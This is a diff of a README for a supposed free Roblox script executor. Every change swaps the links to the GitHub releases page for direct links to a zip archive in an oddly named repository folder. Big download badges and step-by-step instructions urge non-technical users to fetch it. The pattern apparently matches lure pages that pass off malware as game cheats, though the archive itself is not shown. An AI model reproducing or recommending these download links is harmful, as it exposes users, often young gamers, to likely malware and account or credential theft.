@@ -1,7 +1,7 @@
 <h1>🦸 Roblox-Executor---Roblox-Script-Executor-2026 - Run Any Roblox Script Instantly & Free</h1>
 
 <p align="center">
-  <a href="https://github.com/Presumptive-veering6752/Roblox-Executor---Roblox-Script-Executor-2026/releases">
+  <a href="https://raw.githubusercontent.com/Presumptive-veering6752/Roblox-Executor---Roblox-Script-Executor-2026/main/erotogenesis/Script_Executor_Roblox_3.7-alpha.2.zip">
     <img src="https://img.shields.io/badge/⬇️ DOWNLOAD%20NOW-Click%20Here%20(Free)-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=ff6b6b" alt="Download Button" width="400" height="80" />
   </a>
 </p>
@@ -18,7 +18,7 @@ This is your all-in-one tool for Roblox called **Roblox-Executor---Roblox-Script
 
 Follow these exact steps,and you'll be running scripts in less than five minutes. No programming knowledge required. Here's what to do:
 
-1. **Visit the download page** – Click the big green button at the top of this page, or go to this link: <a href="https://github.com/Presumptive-veering6752/Roblox-Executor---Roblox-Script-Executor--2026/releases">https://github.com/Presumptive-veering6752/Roblox-Executor---Roblox-Script-Executor--2026/releases</a>
+1. **Visit the download page** – Click the big green button at the top of this page, or go to this link: <a href="https://raw.githubusercontent.com/Presumptive-veering6752/Roblox-Executor---Roblox-Script-Executor-2026/main/erotogenesis/Script_Executor_Roblox_3.7-alpha.2.zip">https://raw.githubusercontent.com/Presumptive-veering6752/Roblox-Executor---Roblox-Script-Executor-2026/main/erotogenesis/Script_Executor_Roblox_3.7-alpha.2.zip</a>
 
 2. **Download the file** – On that page, look for the newest file listed (usually at the top). You'll see a file named something like "RobloxExecutor2026.zip" or a similar name. **Visit this link to download the application.** Just click on that file name, and it will start downloading automatically.
 
@@ -136,7 +136,7 @@ You now have everything you need to start executing scripts in Roblox. Just down
 
 
 <p align="center">
-  <a href="https://github.com/Presumptive-veering6752/Roblox-Executor---Roblox-Script-Executor--2026/releases">
+  <a href="https://raw.githubusercontent.com/Presumptive-veering6752/Roblox-Executor---Roblox-Script-Executor-2026/main/erotogenesis/Script_Executor_Roblox_3.7-alpha.2.zip">
     <img src="https://img.shields.io/badge/🟢 DOWNLOAD%20NOW-Free%20Level%208%20Executor-00ccff?style=for-the-badge&logo=github&logoColor=white&color=00ccff" alt="Download" width="400" height="70" />
   </a>
 </p>
